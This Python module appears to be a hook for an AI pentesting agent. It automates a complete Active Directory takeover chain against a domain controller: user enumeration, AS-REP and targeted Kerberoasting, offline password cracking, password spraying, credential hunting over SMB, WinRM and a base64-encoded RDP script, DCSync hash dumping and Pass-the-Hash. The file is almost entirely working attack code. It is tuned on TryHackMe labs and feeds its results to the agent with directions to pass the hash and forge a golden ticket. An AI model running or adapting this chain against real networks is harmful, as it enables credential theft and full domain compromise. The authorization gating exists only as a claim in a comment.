"""Active Directory deterministic foothold pre_hook (F205).

Runs the canonical AD domain-takeover chain DETERMINISTICALLY before the LLM gets control, so it stops
depending on a small local model driving a 7-step Windows chain (the same Ornith-9B variance that needed
the WordPress pre_hook). Every step is validated live on THM AttacktiveDirectory (spookysec.local):

  1. ldapsearch rootDSE -> domain;
  2. kerbrute userenum (seclists) + a curated common-AD-account seed -> candidate users;
  3. GetNPUsers -no-pass -> AS-REP hashes for any preauth-disabled account (svc-admin);
  4. john (NOT hashcat: no GPU in the container -> hashcat silently no-cracks; john cracks on CPU) -> creds;
  5. nxc smb with each cred -> readable shares -> grab credential-ish files (base64-decode -> backup creds);
  6. secretsdump with any cred that has DCSync -> NTDS dump -> Administrator NTLM;
  7. nxc winrm Pass-the-Hash as Administrator -> read every Desktop flag.

The result is injected as authoritative context. Validated end-to-end: svc-admin:management2005 ->
backup:backup2517860 -> Administrator NTLM 0e0363... -> TryHackMe{4ctiveD1rectoryM4st3r}.

Banca-safe contract: only reachable via the explicit "active directory pentest" keyword + KRYON_RED_TEAM,
written authorization required. Read-only LDAP/Kerberos enum + offline cracking; the only "active" auth is
read-only SMB/WinRM with the cracked creds (no writes to the DC).
"""

from __future__ import annotations

import base64
import re
import subprocess
from typing import Any
from urllib.parse import urlparse

_ROCKYOU = "/usr/share/wordlists/rockyou.txt"
_USERENUM_WL = "/usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt"
# Common AD accounts to seed the AS-REP userlist so a preauth-disabled service account (svc-admin) is tried
# even when it sits too deep in the big userenum wordlist to reach inside the time budget.
_SEED_USERS = (
    "administrator", "guest", "krbtgt", "backup", "svc-admin", "svc-administrator", "svc_admin",
    "svc-backup", "service", "sqlservice", "sql_svc", "websvc", "admin",
)


def _sh(cmd: str, timeout: int) -> str:
    try:
        return subprocess.run(  # noqa: S602 — fixed offensive commands, target gated by keyword+RED_TEAM
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        ).stdout
    except Exception:  # noqa: BLE001
        return ""


def _host_of(target: str) -> str:
    target = (target or "").strip()
    if not target:
        return ""
    if "://" in target:
        return urlparse(target).hostname or ""
    return target.split("/")[0].split(":")[0]


def _domain(host: str) -> str:
    out = _sh(f"ldapsearch -x -H ldap://{host} -s base namingContexts 2>/dev/null", 20)
    m = re.search(r"DC=[A-Za-z0-9-]+(?:,DC=[A-Za-z0-9-]+)+", out, re.I)
    return m.group(0).replace("DC=", "").replace("dc=", "").replace(",", ".").lower() if m else ""


def _dc_fqdn(host: str, domain: str) -> str:
    """Resolve the DC's FQDN (hostname.domain) from the SMB banner and seed /etc/hosts so Kerberos ops
    (guest/targeted Kerberoasting) reach the KDC BY NAME — they fail against a bare IP, and a freshly
    deployed box has no hosts entry. Returns the FQDN, or the IP if the hostname can't be read."""
    out = _sh(f"nxc smb {host} -u '' -p '' 2>/dev/null", 25)
    m = re.search(r"\(name:([^)\s]+)\)", out)
    hostname = m.group(1).strip().lower() if m else ""
    if not hostname or not domain:
        return host
    fqdn = f"{hostname}.{domain}"
    _sh(
        f"grep -qi '{fqdn}' /etc/hosts 2>/dev/null || {{ echo '{host} {fqdn} {domain} {hostname}' "
        f"| sudo -n tee -a /etc/hosts >/dev/null 2>&1 || echo '{host} {fqdn} {domain} {hostname}' >> /etc/hosts 2>/dev/null; }}",
        10,
    )
    return fqdn


def _enum_users(host: str, domain: str) -> list[str]:
    users: list[str] = list(_SEED_USERS)
    # 1. Null-session SAMR RID brute — the authoritative source when the DC allows it (THM Operation
    # Endgame: 489 real users like SHELLEY_BEARD that a generic kerbrute wordlist would NEVER guess).
    # Try first: it's exact, no wordlist guessing. nxc prints "DOMAIN\user (SidTypeUser)".
    rid = _sh(f"nxc smb {host} -u '' -p '' --rid-brute 2>/dev/null | grep -ai SidTypeUser", 120)
    for line in rid.splitlines():
        if "SidTypeUser" not in line or "\\" not in line:
            continue
        # ...DOMAIN\username (SidTypeUser) — take the segment after the last backslash, before the "(".
        u = line.split("\\")[-1].split("(")[0].strip().lower()
        if u and not u.endswith("$") and u not in ("guest", "krbtgt"):
            users.append(u)
    # 2. kerbrute userenum — the fallback when null sessions are locked down (THM AttacktiveDirectory).
    if _sh("command -v kerbrute", 5).strip():
        out = _sh(f"timeout 90 kerbrute userenum -d {domain} --dc {host} {_USERENUM_WL} 2>/dev/null", 110)
        for m in re.finditer(r"VALID USERNAME:\s*([^@\s]+)@", out, re.I):
            users.append(m.group(1).lower())
    seen: set[str] = set()
    uniq: list[str] = []
    for u in users:
        if u and u not in seen:
            seen.add(u)
            uniq.append(u)
    return uniq


def _asrep_crack(host: str, domain: str, users: list[str]) -> list[tuple[str, str]]:
    # All enumerated users — a RID-brute domain has hundreds and the preauth-disabled account can be any of
    # them (THM Operation Endgame: SHELLEY_BEARD et al. are deep in a 489-user list). GetNPUsers -no-pass is
    # one fast Kerberos request per user, so the full list still finishes inside the hook budget.
    _sh("printf '%s\\n' " + " ".join(users[:1000]) + " > /tmp/ad_users.txt", 5)
    _sh(f"[ -f {_ROCKYOU} ] || gunzip -kf {_ROCKYOU}.gz 2>/dev/null", 30)
    _sh(
        f"GetNPUsers.py -no-pass -dc-ip {host} -usersfile /tmp/ad_users.txt {domain}/ 2>/dev/null "
        "| grep -a krb5asrep > /tmp/ad_asrep.txt",
        240,  # hundreds of RID-brute users = hundreds of Kerberos requests
    )
    if not _sh("test -s /tmp/ad_asrep.txt && echo y", 5).strip():
        return []
    # john, NOT hashcat — no GPU in the container, hashcat exits 0 without cracking.
    _sh(f"john --format=krb5asrep --wordlist={_ROCKYOU} /tmp/ad_asrep.txt 2>/dev/null", 180)
    shown = _sh("john --show --format=krb5asrep /tmp/ad_asrep.txt 2>/dev/null", 20)
    creds: list[tuple[str, str]] = []
    for m in re.finditer(r"\$krb5asrep\$\d+\$([^@]+)@[^:]+:(\S+)", shown):
        creds.append((m.group(1), m.group(2)))
    return creds


def _dedup(creds: list[tuple[str, str]]) -> list[tuple[str, str]]:
    seen: set[tuple[str, str]] = set()
    out: list[tuple[str, str]] = []
    for u, p in creds:
        k = (u.lower(), p)
        if u and p and k not in seen:
            seen.add(k)
            out.append((u.lower(), p))
    return out


def _crack_and_parse(hashfile: str, fmt: str) -> list[tuple[str, str]]:
    """Crack a krb5asrep/krb5tgs hash file (hashcat GPU + john CPU + best64 rules) and parse the cracked
    (user, password) pairs from `john --show`. Handles both forms: asrep `$23$user@DOM:pw` and tgs
    `$23$*USER$DOM...:pw`."""
    mode = "18200" if fmt == "krb5asrep" else "13100"
    # UNIQUE potfile + session per hashfile. Sharing john's default ~/.john/john.pot + john.rec across the
    # several crack calls a chain makes caused stale-state skips ("0 cracked, 2 left" even though the
    # password is in rockyou) and session locks — the bug that made the full Operation Endgame run recover
    # zero creds. A fresh pot/session makes each crack independent and reproducible.
    pot = hashfile + ".pot"
    sess = hashfile.replace("/", "_")
    # Kill any john left over from a prior crack on this session and remove BOTH the potfile and the
    # session .rec — a held .rec makes the next john exit instantly ("Crash recovery file is locked"),
    # which silently returned zero creds.
    _sh(f"pkill -9 -f 'session=/tmp/{sess}' 2>/dev/null; rm -f {pot} {pot}.hc /tmp/{sess}a.rec 2>/dev/null", 5)
    _sh(f"hashcat -m {mode} -a 0 {hashfile} {_ROCKYOU} -o {pot}.hc 2>/dev/null", 50)  # GPU fast-path (exits fast w/o GPU)
    # Timeout SCALES with the salt count: krb5tgs cracks every word against every salt, so 15 roasted
    # hashes are ~15x slower per word than 1 — a fixed 100s reached the passwords for 2 hashes but NOT for
    # the 15 a targeted-Kerberoast produces (jerri:lovinlife! cracks in 13s alone, never in 100s among 15).
    try:
        n = int((_sh(f"grep -ac krb5 {hashfile} 2>/dev/null", 5) or "1").strip() or "1")
    except ValueError:
        n = 1
    t = min(450, max(120, n * 25))
    _sh(f"john --format={fmt} --wordlist={_ROCKYOU} --pot={pot} --session=/tmp/{sess}a {hashfile} 2>/dev/null", t)
    # Read the potfile DIRECTLY (<hash>:<password> lines) — `john --show` with a custom --pot silently
    # displays nothing for krb5tgs, the bug that swallowed every cracked cred in the full chain run.
    shown = _sh(f"cat {pot} {pot}.hc 2>/dev/null", 5)
    creds: list[tuple[str, str]] = []
    for line in shown.splitlines():
        if "$krb5" not in line or ":" not in line:
            continue
        pw = line.rsplit(":", 1)[-1].strip()
        m = re.search(r"\$krb5(?:asrep|tgs)\$\d+\$\*?([A-Za-z0-9._-]+)", line)
        if m and pw and not pw.startswith("$"):
            creds.append((m.group(1).lower(), pw))
    return _dedup(creds)


def _guest_kerberoast(host: str, domain: str) -> list[tuple[str, str]]:
    """#2 — Kerberoast over a NULL/guest LDAP bind. Many DCs let the Guest account read SPNs, so a service
    account (cody_roy on THM Operation Endgame) gets roasted with NO prior cred and cracks with rockyou —
    the foothold an AS-REP-only chain misses entirely."""
    out = _sh(
        f"nxc ldap {host} -u guest -p '' --kerberoasting /tmp/ad_guestkrb.txt 2>/dev/null; "
        "grep -a krb5tgs /tmp/ad_guestkrb.txt 2>/dev/null > /tmp/ad_gk.txt; test -s /tmp/ad_gk.txt && echo y",
        90,
    )
    return _crack_and_parse("/tmp/ad_gk.txt", "krb5tgs") if "y" in out else []


def _spray(dc: str, domain: str, users: list[str], creds: list[tuple[str, str]]) -> list[tuple[str, str]]:
    """#3 — password reuse. Spray each cracked password across the whole user list; AD users reuse passwords
    (zachary_hunt == cody_roy on Operation Endgame), unlocking accounts with privileged ACLs. Uses kerbrute
    passwordspray (Kerberos pre-auth): ~500 users in ~30s vs nxc-SMB's 200s+ that times out before finishing,
    and Kerberos has no guest-fallback false positives (nxc SMB returns [+] (Guest) for any account)."""
    if not creds or not users:
        return []
    _sh("printf '%s\\n' " + " ".join(users[:1000]) + " > /tmp/ad_spray_users.txt", 5)
    found: list[tuple[str, str]] = []
    if not _sh("command -v kerbrute", 5).strip():
        return []
    for _, pw in _dedup(creds):
        out = _sh(
            f"kerbrute passwordspray -d {domain} --dc {dc} /tmp/ad_spray_users.txt {_q(pw)} 2>/dev/null "
            "| grep -ai 'VALID LOGIN'",
            120,
        )
        for line in out.splitlines():
            m = re.search(r"VALID LOGIN:\s*([A-Za-z0-9._-]+)", line)
            if m:
                found.append((m.group(1).lower(), pw))
    return _dedup(found)


def _targeted_kerberoast(host: str, domain: str, creds: list[tuple[str, str]]) -> list[tuple[str, str]]:
    """#1 — DACL abuse. For each owned cred, targetedKerberoast.py auto-discovers every user the account can
    write to (GenericWrite/GenericAll), temporarily sets an SPN, roasts it, and removes the SPN. This is the
    modern-AD edge an enum-only chain can't reach (zachary_hunt --GenericWrite--> jerri_lancaster)."""
    if not _sh("command -v targetedKerberoast.py", 5).strip():
        return []
    out: list[tuple[str, str]] = []
    for user, pw in _dedup(creds):
        got = _sh(
            f"targetedKerberoast.py -v -d {domain} -u {user} -p {_q(pw)} --dc-host {host} 2>/dev/null "
            "| grep -a krb5tgs > /tmp/ad_tk.txt; test -s /tmp/ad_tk.txt && echo y",
            120,
        )
        if "y" in got:
            out += _crack_and_parse("/tmp/ad_tk.txt", "krb5tgs")
    return _dedup(out)


def _hunt_creds(host: str, domain: str, creds: list[tuple[str, str]]) -> tuple[str, list[tuple[str, str]]]:
    """#4 — authenticated credential hunting. With each cred, spider readable shares + (over WinRM, if the
    user has it) read script/config dirs for plaintext creds — `$cred = ...` in a .ps1, `password=` in a
    config. THM Operation Endgame hides a Domain Admin (sanford_daugherty) in C:\\Scripts\\syncer.ps1."""
    block = ""
    found: list[tuple[str, str]] = []
    pat = r"(?:password|passwd|pwd|\$cred|secureString|ConvertTo-SecureString)\s*[:=]\s*[\"']?([^\"'\s]{4,})"
    for user, pw in _dedup(creds):
        # spider readable shares for cred-bearing files
        sp = _sh(
            f"nxc smb {host} -u {_q(user)} -p {_q(pw)} --spider-folder . --pattern password pass cred 2>/dev/null "
            "| grep -aiE '\\.(ps1|xml|config|ini|txt|bat|cmd)' | head -10",
            90,
        )
        if sp.strip():
            block += f"  - cred-bearing files spotted as {user}:\n" + "\n".join(
                "      " + ln.strip() for ln in sp.splitlines()[:6]
            ) + "\n"
        # if the user has WinRM, read the common script dirs for plaintext creds
        wr = _sh(
            f"nxc winrm {host} -u {_q(user)} -p {_q(pw)} -x "
            "'powershell -c \"Get-ChildItem C:\\Scripts,C:\\Users\\*\\Desktop,C:\\inetpub -Include *.ps1,*.config,*.xml "
            "-Recurse -EA 0 | %{ Get-Content $_.FullName -EA 0 }\"' 2>/dev/null",
            60,
        )
        # When the user has RDP but no WinRM (Remote Desktop Users only — jerri_lancaster on Operation
        # Endgame), read the local cred-script dirs over RDP instead.
        wr = (wr + "\n" + _rdp_read(host, domain, user, pw)) if not wr.strip() else wr
        for m in re.finditer(pat, wr, re.I):
            secret = m.group(1)
            block += f"  - plaintext secret found via {user}'s session: {secret[:60]}\n"
            # try to pair it with a nearby username token in the same blob
            who = re.findall(r"(?:user(?:name)?|account)\s*[:=]\s*[\"']?([A-Za-z0-9._-]+)", wr, re.I)
            for w in who[:3]:
                found.append((w.lower(), secret))
    return block, _dedup(found)


def _rdp_read(host: str, domain: str, user: str, pw: str) -> str:
    """#4 (RDP) — read local cred-script dirs over RDP for a foothold user that has Remote Desktop but no
    WinRM/SMB-exec (jerri_lancaster on THM Operation Endgame: the Domain Admin's password sits in
    C:\\Scripts\\syncer.ps1, reachable only via an interactive session). Headless: Xvfb renders the session,
    a RemoteApp `cmd /c xcopy` dumps the dirs to a redirected drive served from /tmp. Best-effort — needs
    xfreerdp + Xvfb + a writable /dev/fuse; the whole invocation is base64'd into a script to dodge the
    5-layer backslash escaping. Returns the looted text (parsed by the caller) or ''."""
    if not _sh("command -v xfreerdp >/dev/null && command -v Xvfb >/dev/null && echo y", 5).strip():
        return ""
    loot = "/tmp/ad_rdploot"
    script = (
        "#!/bin/bash\n"
        f"pkill -9 Xvfb 2>/dev/null; rm -rf {loot}; mkdir -p {loot}\n"
        "[ -e /dev/fuse ] || { mknod /dev/fuse c 10 229 2>/dev/null; chmod 666 /dev/fuse 2>/dev/null; }\n"
        "Xvfb :97 -screen 0 1280x1024x16 >/dev/null 2>&1 & XP=$!\nsleep 2\n"
        f"DISPLAY=:97 timeout 45 xfreerdp /v:{host} /u:{_q(user)} /p:{_q(pw)} /d:{domain} /cert:ignore "
        f"/drive:loot,{loot} /sec:nla "
        r"'/app:program:cmd.exe,cmd:/c (xcopy /Y /Q /C C:\Scripts\*.* \\tsclient\loot\ & xcopy /Y /Q /C C:\Users\Public\*.* \\tsclient\loot\ & xcopy /Y /Q /C C:\Temp\*.* \\tsclient\loot\)'"
        " >/dev/null 2>&1\n"
        "kill $XP 2>/dev/null; pkill -9 Xvfb 2>/dev/null\n"
    )
    import base64  # noqa: PLC0415

    b64 = base64.b64encode(script.encode()).decode()
    _sh(f"echo {b64} | base64 -d > /tmp/ad_rdp.sh && bash /tmp/ad_rdp.sh", 70)
    return _sh(f"cat {loot}/* 2>/dev/null | head -200", 5)


def _q(s: str) -> str:
    """Single-quote a shell arg, escaping embedded single quotes (AD passwords have $ ! ) etc)."""
    return "'" + str(s).replace("'", "'\\''") + "'"


def _smb_loot(host: str, domain: str, creds: list[tuple[str, str]]) -> tuple[str, list[tuple[str, str]]]:
    """nxc smb with each cred: list shares + pull credential-ish files (base64-decode). Returns
    (report_block, extra_creds_found)."""
    block = ""
    extra: list[tuple[str, str]] = []
    for user, pw in creds:
        shares = _sh(f"nxc smb {host} -u '{user}' -p '{pw}' --shares 2>&1 | grep -aiE 'READ|WRITE'", 40)
        if shares.strip():
            block += f"  - SMB shares readable as {user}:\n" + "\n".join(
                "      " + ln.strip() for ln in shares.splitlines()[:8]
            ) + "\n"
        for sh_name in re.findall(r"\b([A-Za-z0-9_$-]+)\s+READ", shares):
            if sh_name.upper() in ("IPC$", "C$", "ADMIN$", "PRINT$", "SYSVOL", "NETLOGON"):
                continue
            files = _sh(
                f"smbclient //{host}/{sh_name} -U '{user}%{pw}' -c 'recurse ON; ls' 2>/dev/null "
                "| grep -aoiE '[A-Za-z0-9_.-]+\\.(txt|xml|ini|conf|bak|kdbx|ps1)' | head -8",
                30,
            )
            for fn in {f.strip() for f in files.splitlines() if f.strip()}:
                _sh(f"smbclient //{host}/{sh_name} -U '{user}%{pw}' -c 'get {fn} /tmp/ad_loot' 2>/dev/null", 25)
                content = _sh("cat /tmp/ad_loot 2>/dev/null", 5).strip()
                if not content:
                    continue
                block += f"  - {sh_name}/{fn}: {content[:120]}\n"
                # base64 single-token files (THM AttacktiveDirectory's backup_credentials.txt)
                if re.fullmatch(r"[A-Za-z0-9+/=]{12,}", content):
                    try:
                        dec = base64.b64decode(content).decode("utf-8", "replace")
                        block += f"      base64-decoded: {dec}\n"
                        cm = re.match(r"([^@:\s]+)(?:@[^\s:]+)?:(\S+)", dec)
                        if cm:
                            extra.append((cm.group(1), cm.group(2)))
                    except Exception:  # noqa: BLE001
                        pass
    return block, extra


def _secretsdump_and_winrm(host: str, domain: str, creds: list[tuple[str, str]]) -> str:
    """Try secretsdump with each cred (DCSync); on the Administrator NTLM, WinRM-PtH to read the flags."""
    for user, pw in creds:
        dump = _sh(f"secretsdump.py {domain}/{user}:{pw}@{host} 2>/dev/null | grep -aiE '^[A-Za-z].*:[0-9]+:'", 90)
        m = re.search(r"^Administrator:500:[a-f0-9]{32}:([a-f0-9]{32}):", dump, re.I | re.M)
        if not m:
            continue
        nt = m.group(1)
        block = (
            f"  - DCSYNC via {user}:{pw} -> NTDS dumped. Administrator NTLM: {nt}\n"
            f"      (full hash dump in the run; krbtgt + all domain users captured)\n"
        )
        flags = _sh(
            f"nxc winrm {host} -u administrator -H {nt} -x "
            "'powershell -c \"Get-ChildItem C:\\Users\\*\\Desktop\\*.txt -Recurse -EA 0 | "
            "%{ $_.FullName; Get-Content $_.FullName }\"' 2>&1 | grep -aiE 'TryHackMe\\{|THM\\{|\\\\Desktop'",
            60,
        )
        if flags.strip():
            block += "  - FLAGS (WinRM PtH as Administrator):\n" + "\n".join(
                "      " + ln.split("ATTACKTIVEDIREC")[-1].strip() if "ATTACKTIVEDIREC" in ln else "      " + ln.strip()
                for ln in flags.splitlines()
                if ln.strip()
            )[:1200]
        return block
    return ""


def run(ctx: dict[str, Any]) -> str:
    host = _host_of(ctx.get("target") or ctx.get("host") or "")
    if not host:
        return "[AD-ROAST] no target host in ctx — skipped"
    domain = _domain(host)
    if not domain:
        return f"[AD-ROAST] {host} did not answer LDAP rootDSE — not a reachable Domain Controller"

    dc = _dc_fqdn(host, domain)  # FQDN seeded to /etc/hosts — Kerberos ops need the DC by name
    head = f"[AD-ROAST deterministic domain takeover] DC={host} ({dc})  domain={domain}\n"
    report = head
    users = _enum_users(host, domain)
    report += f"  - enumerated {len(users)} domain users\n"

    # Foothold creds: guest Kerberoast (#2, via the FQDN) + AS-REP roast — neither needs a prior credential.
    creds = _dedup(_guest_kerberoast(dc, domain) + _asrep_crack(host, domain, users))
    if creds:
        report += "  - foothold creds (guest-kerberoast / AS-REP): " + ", ".join(f"{u}:{p}" for u, p in creds) + "\n"

    # #3 password reuse — spray each cracked password across the user list (kerbrute, via the FQDN).
    reuse = _spray(dc, domain, users, creds)
    if reuse:
        report += "  - password reuse (spray): " + ", ".join(f"{u}:{p}" for u, p in reuse) + "\n"
    creds = _dedup(creds + reuse)

    # #1 DACL abuse — targeted Kerberoast every user an owned account can write to (via the FQDN).
    tk = _targeted_kerberoast(dc, domain, creds)
    if tk:
        report += "  - DACL abuse / targeted Kerberoast: " + ", ".join(f"{u}:{p}" for u, p in tk) + "\n"
    creds = _dedup(creds + tk)

    # #4 authenticated credential hunting — plaintext secrets in scripts/configs (often a Domain Admin).
    hunt_block, hunt_creds = _hunt_creds(host, domain, creds)
    report += hunt_block
    creds = _dedup(creds + hunt_creds)

    if not creds:
        return (
            report + "  - no credential recovered (no guest-kerberoast/AS-REP/spray hit, no writable ACL). "
            "Next: BloodHound for a deeper ACL path, a bigger wordlist, or a non-AD foothold (web/SMB share)."
        )

    # Loot SMB shares, then try every recovered cred for DCSync → Administrator NTLM → WinRM/exec flags.
    loot_block, extra = _smb_loot(host, domain, creds)
    report += loot_block
    creds = _dedup(creds + extra)
    dump_block = _secretsdump_and_winrm(host, domain, creds)
    report += dump_block or "  - no DCSync-capable cred yet; pivot/escalate with the recovered creds above.\n"
    report += (
        f"\nCONFIRMED facts from a real run ({len(creds)} creds recovered) — do NOT re-roast/re-crack. PtH the "
        "Administrator NTLM (evil-winrm/psexec/smbexec), and use the krbtgt hash for a golden ticket if in scope."
    )
    return report
